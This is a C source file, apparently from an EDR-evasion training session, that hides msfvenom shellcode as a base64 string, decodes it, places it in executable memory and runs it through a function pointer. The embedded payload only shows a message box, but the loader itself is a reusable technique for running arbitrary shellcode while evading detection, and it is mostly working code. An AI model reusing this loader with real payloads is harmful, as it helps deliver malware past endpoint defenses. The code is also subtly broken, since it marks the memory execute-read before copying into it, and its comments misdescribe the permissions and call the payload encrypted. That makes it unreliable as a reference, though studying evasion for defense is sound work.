/* Payload obfuscation through the use of base64 encoding */

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>


/* Generated using command
"msfvenom -p windows/x64/messagebox ICON=INFORMATION TEXT="Cybershield 2025!" TITLE="Intro to EDR Evasion" --format c" */

// Base64 encoded payload
PBYTE payload = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dPkiNjTQBAABBukx3Jgf/1UnHwUAAAAA+SI2VDgEAAD5MjYUfAQAASDHJQbpFg1YH/9VIMclBuvC1olb/1UN5YmVyc2hpZWxkIDIwMjUASW50cm8gdG8gRURSIEV2YXNpb24AdXNlcjMyLmRsbAA=";

// Base64 decoder used: https://github.com/realapire/base64-encode-decode
const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char* base64_decode(const char* input, size_t* output_length) {
    size_t input_length = strlen(input);
    if (input_length % 4 != 0) {
        return NULL; // Invalid Base64 input length
    }

    // Calculate the expected output length
    *output_length = (3 * input_length) / 4;
    if (input[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (input[input_length - 2] == '=') {
        (*output_length)--;
    }

    // Allocate memory for the decoded data
    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) {
        return NULL; // Memory allocation failed
    }

    // Initialize variables for decoding process
    size_t j = 0;
    uint32_t sextet_bits = 0;
    int sextet_count = 0;

    // Loop through the Base64 input and decode it
    for (size_t i = 0; i < input_length; i++) {
        // Convert Base64 character to a 6-bit value
        uint32_t base64_value = 0;
        if (input[i] == '=') {
            base64_value = 0;
        }
        else {
            const char* char_pointer = strchr(base64_chars, input[i]);
            if (char_pointer == NULL) {
                free(decoded_data);
                return NULL; // Invalid Base64 character
            }
            base64_value = char_pointer - base64_chars;
        }

        // Combine 6-bit values into a 24-bit sextet
        sextet_bits = (sextet_bits << 6) | base64_value;
        sextet_count++;

        // When a sextet is complete, decode it into three bytes
        if (sextet_count == 4) {
            decoded_data[j++] = (sextet_bits >> 16) & 0xFF;
            decoded_data[j++] = (sextet_bits >> 8) & 0xFF;
            decoded_data[j++] = sextet_bits & 0xFF;
            sextet_bits = 0;
            sextet_count = 0;
        }
    }

    return decoded_data;
}

int main(void) {

    // Decode the base64 encoded payload, giving us the actual bytes that will be run
    SIZE_T decoded_payload_size;
    PBYTE decoded_payload = base64_decode(payload, &decoded_payload_size);

    // Allocate memory that has read, write, and execute permission.
	PBYTE executable_memory = VirtualAlloc(NULL, decoded_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (executable_memory == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}


    DWORD old_protect = NULL;
    VirtualProtect(executable_memory, decoded_payload_size, PAGE_EXECUTE_READ, &old_protect);

    // Copy the encrypted payload into the allocated memory
	memcpy(executable_memory, decoded_payload, decoded_payload_size);

    // Run the payload using pointer magic
	(*(VOID(*)()) executable_memory)();

	getchar();
}